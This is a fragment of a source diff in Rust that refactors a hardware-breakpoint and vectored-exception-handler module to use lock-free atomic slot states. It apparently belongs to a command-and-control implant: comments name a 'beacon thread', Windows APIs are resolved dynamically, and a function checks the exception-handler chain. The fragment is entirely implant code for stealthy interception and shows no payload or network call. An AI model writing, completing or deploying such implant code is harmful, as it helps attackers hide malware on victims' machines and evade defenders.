+    HWBP_COUNT.fetch_add(1, core::sync::atomic::Ordering::Release);
     diag(b'k'); // registered
     Ok(slot)
 }
 
 /// Remove a hardware breakpoint and restore the original DR7.
+///
+/// # Disarming protocol (CRITICAL-6/7)
+///
+/// 1. Atomically claim the slot OCCUPIED→CLAIMED via CAS. The VEH now skips
+///    this slot (it only acts on OCCUPIED), so any in-flight #DB for it is
+///    correctly passed through as "not ours".
+/// 2. Decrement the live count.
+/// 3. Publish VACANT (Release) so a future add_hwbp can reclaim the slot.
+/// 4. Disarm the DR register via NtSetContextThread (clear L/RW/LEN + DRx).
+///    Once disarmed, no new #DB can fire from this slot on this thread.
+/// 5. If the live count reached zero, remove the VEH handler.
+///
+/// Because the beacon thread is the sole faulting thread for local-enable
+/// HWBPs, and `remove_hwbp` runs on the beacon thread, there is no window
+/// where this thread is both executing the target address and inside
+/// `remove_hwbp`. The CAS+VACANT sequence makes the teardown safe even if
+/// that assumption is ever violated by a global-enable (G bit) breakpoint.
 pub unsafe fn remove_hwbp(slot: usize) -> Result<(), &'static str> {
-    HWBP_LOCK.lock();
-    if slot >= 4 || HWBP_ENTRIES[slot].is_none() {
-        HWBP_LOCK.unlock();
+    if slot >= 4 {
         return Err("invalid slot");
     }
-    let _entry = HWBP_ENTRIES[slot].take();
-    HWBP_COUNT -= 1;
-    HWBP_LOCK.unlock();
+    // Atomically claim the slot for teardown: OCCUPIED→CLAIMED. If the CAS
+    // fails the slot wasn't armed (or another remover raced us); treat both
+    // as "invalid slot" so the caller knows nothing was removed.
+    let prev = HWBP_SLOT_STATE[slot].compare_exchange(
+        SLOT_OCCUPIED,
+        SLOT_CLAIMED,
+        core::sync::atomic::Ordering::Acquire,
+        core::sync::atomic::Ordering::Relaxed,
+    );
+    if prev.is_err() {
+        return Err("invalid slot");
+    }
+
+    // Read out the saved entry. The read documents that the cell is now ours;
+    // original_dr7 is applied implicitly via DR7 bit-clearing below.
+    // SAFETY: slot is CLAIMED (we just won the CAS), so we are the sole
+    // accessor of this cell.
+    let _entry: HwbpEntry = core::ptr::read(HWBP_POOL[slot].get());
+
+    HWBP_COUNT.fetch_sub(1, core::sync::atomic::Ordering::Release);
+
+    // Publish VACANT so the VEH skips this slot from now on and a future
+    // add_hwbp can reclaim it.
+    HWBP_SLOT_STATE[slot].store(SLOT_VACANT, core::sync::atomic::Ordering::Release);
 
     // Allocate CONTEXT buffer.
     let va_addr = crate::resolve::export_addr(b"kernelbase.dll", b"VirtualAlloc")
@@ -807,6 +999,7 @@ pub unsafe fn remove_hwbp(slot: usize) -> Result<(), &'static str> {
         return Err("VirtualAlloc for CONTEXT failed");
     }
     let base = ctx_buf as usize;
+    // SAFETY: freshly-allocated 1232-byte RW buffer we own.
     core::ptr::write_bytes(ctx_buf as *mut u8, 0, 1232);
 
     ctx_write_u32_at(base, CTX_CONTEXT_FLAGS, CONTEXT_DEBUG_REGISTERS);
@@ -840,21 +1033,31 @@ pub unsafe fn remove_hwbp(slot: usize) -> Result<(), &'static str> {
 
     free_ctx_buf(ctx_buf);
 
-    // Remove VEH when no more breakpoints are active.
-    HWBP_LOCK.lock();
-    let no_more = HWBP_COUNT == 0;
-    HWBP_LOCK.unlock();
-    if no_more && !VEH_HANDLE.is_null() {
-        if let Some(a) =
-            crate::resolve::export_addr(b"kernelbase.dll", b"RemoveVectoredExceptionHandler")
-                .or_else(|| {
-                    crate::resolve::export_addr(b"kernel32.dll", b"RemoveVectoredExceptionHandler")
-                })
-        {
-            type RemoveVEH = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
-            let f: RemoveVEH = core::mem::transmute(a);
-            f(VEH_HANDLE);
-            VEH_HANDLE = core::ptr::null_mut();
+    // Remove VEH when no more breakpoints are active. Load the count with
+    // Acquire (paired with the fetch_sub Release above); if zero, swap the
+    // handle out (AcqRel) and call RemoveVectoredExceptionHandler. The swap
+    // prevents double-removal by concurrent callers.
+    if HWBP_COUNT.load(core::sync::atomic::Ordering::Acquire) == 0 {
+        let handle = VEH_HANDLE.swap(core::ptr::null_mut(), core::sync::atomic::Ordering::AcqRel);
+        if !handle.is_null() {
+            if let Some(a) =
+                crate::resolve::export_addr(b"kernelbase.dll", b"RemoveVectoredExceptionHandler")
+                    .or_else(|| {
+                        crate::resolve::export_addr(
+                            b"kernel32.dll",
+                            b"RemoveVectoredExceptionHandler",
+                        )
+                    })
+            {
+                type RemoveVEH = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
+                let f: RemoveVEH = core::mem::transmute(a);
+                f(handle);
+            } else {
+                // Could not resolve the remover — put the handle back so a
+                // future remove_hwbp can retry. (The VEH stays registered,
+                // which is harmless: it does nothing for vacant slots.)
+                VEH_HANDLE.store(handle, core::sync::atomic::Ordering::Release);
+            }
         }
     }
     Ok(())
@@ -867,19 +1070,20 @@ unsafe fn free_ctx_buf(buf: *mut core::ffi::c_void) {
     {
         type VFree = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32) -> i32;
         let vff: VFree = core::mem::transmute(vf_addr);
+        // SAFETY: buf was returned by VirtualAlloc with MEM_RESERVE|COMMIT;
+        // MEM_RELEASE (0x8000) with size 0 frees the entire region.
         vff(buf, 0, 0x8000); // MEM_RELEASE
     }
 }
 
 pub fn active_count() -> usize {
-    HWBP_LOCK.lock();
-    let n = unsafe { HWBP_COUNT };
-    HWBP_LOCK.unlock();
-    n
+    HWBP_COUNT.load(core::sync::atomic::Ordering::Acquire)
 }
 
 pub fn is_ready() -> bool {
-    unsafe { !SHADOW_BUF.is_null() }
+    !SHADOW_BUF
+        .load(core::sync::atomic::Ordering::Acquire)
+        .is_null()
 }
 
 /// Returns true if the VEH chain was found clean during probe.
